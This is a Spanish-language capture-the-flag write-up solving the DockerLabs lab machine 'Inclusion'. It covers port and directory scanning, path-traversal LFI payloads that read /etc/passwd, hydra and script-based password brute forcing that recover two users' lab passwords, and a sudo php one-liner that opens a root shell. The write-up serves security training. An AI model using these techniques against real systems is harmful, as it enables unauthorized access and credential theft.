#MAQUINA #DOCKERLABS #MEDIO
#LFI #SU_BRUTE_FORCE 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Inclusion** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 08:34 CET
Initiating ARP Ping Scan at 08:34
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 08:34, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:34
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 08:34, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-17 08:34:26 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)**, **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 08:34 CET
Nmap scan report for gatekeeperhr.com (172.17.0.2)
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
|_  256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.55 seconds



```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 08:35 CET
Nmap scan report for gatekeeperhr.com (172.17.0.2)
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /shop/: Potentially interesting folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

Tenemos un directorio **shop** posiblemente interesante.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vamos a utilizar **gobuster** para ver directorios interesantes:

   ```bash

gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,js,txt,png,jpg,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/shop                 (Status: 301) [Size: 307] [--> http://172.17.0.2/shop/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================


```

Vemos el directorio **shop**, y al volver a utilizar el gobuster, vemos que solo hay un **index.php** dentro y al echarle un ojo vemos en la web lo siguiente:

```bash
"Error de Sistema: ($_GET['archivo']");
```

Posible **LFI**

# EXPLOTACION

Al revisar utilizando **wfuzz** :

```bash
wfuzz -u "http://172.17.0.2/shop/index.php?archivo=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt  --hl=44
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/shop/index.php?archivo=FUZZ
Total requests: 569

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000051:   200        68 L     117 W      2253 Ch     "../../../../etc/passwd"                                                                                                 
000000053:   200        68 L     117 W      2253 Ch     "../../../../../../etc/passwd"                                                                                           
000000057:   200        68 L     117 W      2253 Ch     "../../../../../../../../../../etc/passwd"                                                                               
000000058:   200        68 L     117 W      2253 Ch     "../../../../../../../../../../../etc/passwd"                                                                            
000000055:   200        68 L     117 W      2253 Ch     "../../../../../../../../etc/passwd"                                                                                     
000000060:   200        68 L     117 W      2253 Ch     "../../../../../../../../../../../../../etc/passwd"                                                                      
000000062:   200        68 L     117 W      2253 Ch     "../../../../../../../../../../../../../../../../etc/passwd"                                                             
000000056:   200        68 L     117 W      2253 Ch     "../../../../../../../../../etc/passwd"                                                                                  
000000059:   200        68 L     117 W      2253 Ch     "../../../../../../../../../../../../etc/passwd"                                                                         
000000052:   200        68 L     117 W      2253 Ch     "../../../../../etc/passwd"                                                                                              
000000061:   200        68 L     117 W      2253 Ch     "../../../../../../../../../../../../../../etc/passwd"                                                                   
000000054:   200        68 L     117 W      2253 Ch     "../../../../../../../etc/passwd"                                                                                        
000000400:   200        90 L     133 W      1655 Ch     "../../../../../../../../../../etc/group"                                                                                
000000398:   200        90 L     133 W      1655 Ch     "../../../../../../../../etc/group"                                                                                      
000000399:   200        90 L     133 W      1655 Ch     "../../../../../../../../../etc/group"                                                                                   
000000401:   200        90 L     133 W      1655 Ch     "../../../../../../../../../../../etc/group"                                                                             
000000397:   200        90 L     133 W      1655 Ch     "../../../../../../../etc/group"                                                                                         
000000395:   200        90 L     133 W      1655 Ch     "../../../../../etc/group"                                                                                               
000000396:   200        90 L     133 W      1655 Ch     "../../../../../../etc/group"                                                                                            
000000394:   200        90 L     133 W      1655 Ch     "../../../../etc/group"                                                                                                  
000000404:   200        90 L     133 W      1655 Ch     "../../../../../../../../../../../../../../etc/group"                                                                    
000000402:   200        90 L     133 W      1655 Ch     "../../../../../../../../../../../../etc/group"                                                                          
000000403:   200        90 L     133 W      1655 Ch     "../../../../../../../../../../../../../etc/group" 


```

Vemos que es vulnerable a un **LFI**.

Al apuntar al **/etc/passwd**, podemos sacar dos usuarios interesantes(**seller** y **machi**) :

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
seller:x:1000:1000:seller,,,:/home/seller:/bin/bash
manchi:x:1001:1001:manchi,,,:/home/manchi:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Usamos **hydra** para intentar sacar la contraseña:

   ```bash
hydra -l manchi -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-17 09:00:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: manchi   password: lovely
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 23 final worker threads did not complete until end.
[ERROR] 23 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-17 09:00:19

```
**usuario : manchi**
**contraseña: lovely**

# ESCALADA PRIVILEGIOS

No encuentro manera de escalar privilegios, optamos por usar fuerza bruta.
Nos descargamos : https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.py y lo compartimos con **scp**.

```bash
manchi@d6bfacbad12d:~$ ./Linux-Su-Force.sh seller rockyou.txt 
Contraseña encontrada para el usuario seller: qwerty

```

**Usuario -> seller**
**Contra -> qwerty**

ESTAMOS COMO SELLER.

Vemos si el usuario tiene permisos SUDO:
   ```bash
seller@d6bfacbad12d:~$ sudo -l
Matching Defaults entries for seller on d6bfacbad12d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User seller may run the following commands on d6bfacbad12d:
    (ALL) NOPASSWD: /usr/bin/php

```

Vemos **php** con permisos SUDO:

   ```bash
seller@d6bfacbad12d:~$ sudo php -r "system('/bin/bash');"
root@d6bfacbad12d:/home/seller# whoami
root
root@d6bfacbad12d:/home/seller# 
```

**YA ESTAMOS COMO ROOT.